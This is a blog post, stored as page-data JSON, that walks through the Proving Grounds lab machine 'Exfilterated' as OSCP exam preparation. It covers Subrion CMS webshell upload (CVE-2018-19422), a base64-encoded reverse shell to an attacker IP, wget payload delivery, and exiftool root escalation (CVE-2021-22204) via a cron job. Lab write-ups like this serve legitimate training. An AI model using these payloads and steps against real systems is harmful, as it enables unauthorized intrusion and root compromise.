{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240910/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1.Recon</h2>\n<ul>\n<li>nmap</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ sudo nmap 192.168.157.163 -p- -T4 \r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:11 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.039s latency).\r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 19.99 seconds\r\n</code></pre></div>\n<ul>\n<li>port 22</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">└─$ sudo nmap 192.168.157.163 -p22 -T4 -A -sC -sV\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.033s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)\r\n|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)\r\n|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.5 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n</code></pre></div>\n<ul>\n<li>port 80</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ sudo nmap 192.168.157.163 -p80 -T4 -A -sC -sV\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT\r\nNmap scan report for 192.168.157.163\r\nHost is up (0.029s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\n| http-robots.txt: 7 disallowed entries \r\n| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ \r\n|_/updates/\r\n|_http-title: Did not follow redirect to http://exfiltrated.offsec/\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.7 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).</code></pre></div>\n<p>Let’s add exfilterated.offsec to /etc/hosts and continue.</p>\n<h2>2. Enumeration</h2>\n<p>Since ssh has nothing special, we’ll focus on webapp enumeration</p>\n<h4>2.1 Webapp enumeration</h4>\n<ul>\n<li>index</li>\n</ul>\n<p>![[../contentImages/exfiltrated/1.png]]</p>\n<ul>\n<li>footer</li>\n</ul>\n<p>![[../contentImages/exfiltrated/2.png]]</p>\n<p>It is impossible to do subdirectory enumeration since this is sso application. Let’s continue with vhost enumeration.</p>\n<p>there was /login endpoint, and I could log in with admin:admin</p>\n<p>![[../contentImages/exfiltrated/3.png]]</p>\n<p>And we have this page\r\n![[../contentImages/exfiltrated/4.png]]</p>\n<p>![[../contentImages/exfiltrated/5.png]]</p>\n<p>Time to search for cve</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated]\r\n└─$ searchsploit subrion  \r\n------------------------------------------ ---------------------------------\r\nSubrion 3.x - Multiple Vulnerabilities                                                        | php/webapps/38525.txt\r\nSubrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                       | php/webapps/47469.txt\r\nSubrion Auto Classifieds - Persistent Cross-Site Scripting                                    | php/webapps/14391.txt\r\nSUBRION CMS - Multiple Vulnerabilities                                                        | php/webapps/17390.txt\r\nSubrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/21267.txt\r\nsubrion CMS 2.2.1 - Multiple Vulnerabilities                                                  | php/webapps/22159.txt\r\nSubrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/47851.txt\r\nSubrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting       | php/webapps/40553.txt\r\nSubrion CMS 4.0.5 - SQL Injection                                                             | php/webapps/40202.txt\r\nSubrion CMS 4.2.1 - 'avatar[path]' XSS                                                        | php/webapps/49346.txt\r\nSubrion CMS 4.2.1 - Arbitrary File Upload                                                     | php/webapps/49876.py\r\nSubrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                              | php/webapps/50737.txt\r\nSubrion CMS 4.2.1 - Cross-Site Scripting                                                      | php/webapps/45150.txt\r\nSubrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                         | php/webapps/51110.txt\r\n---------------------------------------------------------------------------------------------- ---------------------------------</code></pre></div>\n<p>So there is File Upload vuln, maybe we can use it.</p>\n<p>![[../contentImages/exfiltrated/6.png]]</p>\n<p>After reading and visiting the site here, indeed, this is version 4.2.1 which should be vulnerable.</p>\n<p>![[../contentImages/exfiltrated/7.png]]</p>\n<p>So I added the member with admin:admin (to be sure) then executed the cve</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2018-19422-SubrionCMS-RCE]\r\n└─$ python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin\r\n[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \r\n\r\n[+] Trying to connect to: http://exfiltrated.offsec/panel/\r\n[+] Success!\r\n[+] Got CSRF token: c1MUFsfy6KZ6qep36fZitvhrocirAdSW8mf8fOcL\r\n[+] Trying to log in...\r\n[+] Login Successful!\r\n\r\n[+] Generating random name for Webshell...\r\n[+] Generated webshell name: qltfwzcbozjgzkw\r\n\r\n[+] Trying to Upload Webshell..\r\n[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qltfwzcbozjgzkw.phar \r\n\r\n$ ls /home\r\ncoaran\r\n\r\n$ cat /home/coaran/local.txt\r\naaaa1896196e4b2544127cb5a58e4978\r\n\r\n$ </code></pre></div>\n<p>That’s it for initial foothold</p>\n<h2>3. Privesc</h2>\n<p>Used classic method for revshell</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"> echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMjI0Iiw4MCk7ZXhlYygic2ggPCYzID4mMyAyPiYzIik7Jw== | base64 --decode\r\n--------------------------------------------\r\nbash -i\r\nbash: cannot set terminal process group (982): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@exfiltrated:/var/www/html/subrion/uploads$ \r\n</code></pre></div>\n<p>Now downloaded linpeas.py</p>\n<p>Hmm nothing interesting?</p>\n<p>Downloaded pspy64</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2024/09/07 19:02:01 CMD: UID=0    PID=33016  | bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33015  | bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33014  | /bin/sh -c bash /opt/image-exif.sh \r\n2024/09/07 19:02:01 CMD: UID=0    PID=33013  | /usr/sbin/CRON -f </code></pre></div>\n<p>Interesting image-exif.sh script is there.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/opt$ cat image-exif.sh\r\ncat image-exif.sh\r\n#! /bin/bash\r\n#07/06/18 A BASH script to collect EXIF metadata \r\n\r\necho -ne \"\\\\n metadata directory cleaned! \\\\n\\\\n\"\r\n\r\n\r\nIMAGES='/var/www/html/subrion/uploads'\r\n\r\nMETA='/opt/metadata'\r\nFILE=`openssl rand -hex 5`\r\nLOGFILE=\"$META/$FILE\"\r\n\r\necho -ne \"\\\\n Processing EXIF metadata now... \\\\n\\\\n\"\r\nls $IMAGES | grep \"jpg\" | while read filename; \r\ndo \r\n    exiftool \"$IMAGES/$filename\" >> $LOGFILE \r\ndone\r\n\r\necho -ne \"\\\\n\\\\n Processing is finished! \\\\n\\\\n\\\\n\"\r\nwww-data@exfiltrated:/opt$ \r\n</code></pre></div>\n<ol>\n<li>grep “jpg” isn’t secure enough, we can create jpg.sh</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/opt/metadata$ cat 19ffa20cf8\r\ncat 19ffa20cf8\r\nExifTool Version Number         : 11.88\r\nFile Name                       : jpg.sh\r\nDirectory                       : /var/www/html/subrion/uploads\r\nFile Size                       : 20 bytes\r\nFile Modification Date/Time     : 2024:09:07 19:12:25+00:00\r\nFile Access Date/Time           : 2024:09:07 19:12:25+00:00\r\nFile Inode Change Date/Time     : 2024:09:07 19:12:25+00:00\r\nFile Permissions                : rw-r--r--\r\nFile Type                       : sh script\r\nFile Type Extension             : sh\r\nMIME Type                       : text/x-sh\r\nwww-data@exfiltrated:/opt/metadata$ </code></pre></div>\n<p>Okay, we are almost there.\r\n![[../contentImages/exfiltrated/8.png]]</p>\n<p>Let’s try this one.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">                                                                                                                                \r\n┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ python exploit.py                      \r\n    1 image files updated\r\n                                                                                                                                \r\n┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ ls\r\nREADME.md  configfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz\r\n</code></pre></div>\n<p>So I created this malicious image.jpg file, downloaded it, and moved to /uploads folder, and waited calmly:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/tmp$ wget http://192.168.45.224:8000/image.jpg\r\nwget http://192.168.45.224:8000/image.jpg\r\n--2024-09-07 19:23:54--  http://192.168.45.224:8000/image.jpg\r\nConnecting to 192.168.45.224:8000... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 47571 (46K) [image/jpeg]\r\nSaving to: 'image.jpg'\r\n\r\n     0K .......... .......... .......... .......... ......    100%  797K=0.06s\r\n\r\n2024-09-07 19:23:54 (797 KB/s) - 'image.jpg' saved [47571/47571]\r\n\r\nwww-data@exfiltrated:/tmp$ ls\r\nls\r\nimage.jpg\r\njpg.sh\r\nlinpeas.sh\r\npspy64\r\ntmux-33\r\nwww-data@exfiltrated:/tmp$ mv image.jpg /var/www/html/subrion/uploads/\r\nmv image.jpg /var/www/html/subrion/uploads/</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ nc -lvnp 8000        \r\nlistening on [any] 8000 ...\r\nconnect to [192.168.45.224] from (UNKNOWN) [192.168.157.163] 45380\r\n/bin/sh: 0: can't access tty; job control turned off\r\n# whoami\r\nroot\r\n# cat /root/proof.txt\r\n48fd81b4877866fad48bfa0b2987a3ef</code></pre></div>\n<p>That’s it!</p>","frontmatter":{"title":"OSCP Prep: Proving Grounds : Exfilterated","summary":"Solving Exfilterated machine from Proving Grounds","date":"2024.09.10.","before":"2024.09.06.","after":"2024.09.13.","categories":["C-SEC","proving_grounds","full-machine","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC1ElEQVR42p2T204bVxSG55GqJjgEe3w22B4848PYYw82PoGMU5s0QMEoIRALQUl70RaUQisg6nvxAFWr9IIGbAP9umanva7ULf36196a9a/jaNVGl/riEu5CC7voUnJqCk6lgV1uUChWyeYr/wkrV1asIef+/p77uzvFDw8P/J/z1z9+2p0I/f7br1xdXfHhwx+MRmMFL8BkMmHisYfRiDvBaDLm+uaGP6+vGd3ecvPxI7dyvxV7PB6jtdrLNBptGs0l6o0lmh7X22z2e/x0MOT9yfdcnF9yef4LF8c/cHlyzOXpKRfC56c/c/bdCe92tnj/7pizH8/QHk895dHjaXy+GaaU/RTv7bPPfWSiUdZqFTa/2uX1y12+frnB4XDIwf4B+/tHvNk7ZNDf4HkqwXazxnD9BZoejBIMxQiF4kQiCfRgjKAHeZvxhwgEIpSKNXoVh0E1x9H2Om93d/hmb49vD9+y/eUWTjzJaqnATmcZzXOMRGaVWCT8r2hU2WEJMhMIMzPtxzUtNp71WK0UGbh5Xjdd9l+sMuj1MNIWlWSahi1TjsaSGEaWfN4RlCgWK4rT8lHWKpDL2kSiczzyBWi3uxwMj/iiVmMlk6Jv53jzrMuy2yBXqlFvddESswYZ06Zgyw6WqgoFETfms0o0Y3hsoutRnkzrbG6+orOySjpl4ph5HMvGkV1d7vRpSUAtljAwMgW1zOVKnYpEcxeakqlLTLIPBWOqDUE9pgTnkhnW1gfkC1KJvYBbbdPpPld+RspCi4tgKp0jK5tuFxdEeBGnvEhZYFlFlZkn6PXTs6d8fnGu0+utUa22VBssqdBImgpaLJ6WqHIx8phmUQnn8l4f5ZfKOipLJRqWYUmWgcCn0jsrfbak/IyRIz2XkexMJSxDSZGYzZBMZZmfL2CJiCdqZUvCjvTKUqvkrVU49Kl0v6ySX6afiKeIycB0PUJUOKBH+RsP+1oC9AIt2QAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png","srcSet":"/static/100687a0435dc84798cb4768b9db3e23/e70bd/1.png 335w,\n/static/100687a0435dc84798cb4768b9db3e23/02ead/1.png 670w,\n/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png 1340w","sizes":"(min-width: 1340px) 1340px, 100vw"},"sources":[{"srcSet":"/static/100687a0435dc84798cb4768b9db3e23/b6eb7/1.webp 335w,\n/static/100687a0435dc84798cb4768b9db3e23/6a112/1.webp 670w,\n/static/100687a0435dc84798cb4768b9db3e23/fe2a7/1.webp 1340w","type":"image/webp","sizes":"(min-width: 1340px) 1340px, 100vw"}]},"width":1340,"height":880}},"publicURL":"/static/100687a0435dc84798cb4768b9db3e23/1.png"}}}}]}},"pageContext":{"slug":"/240910/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}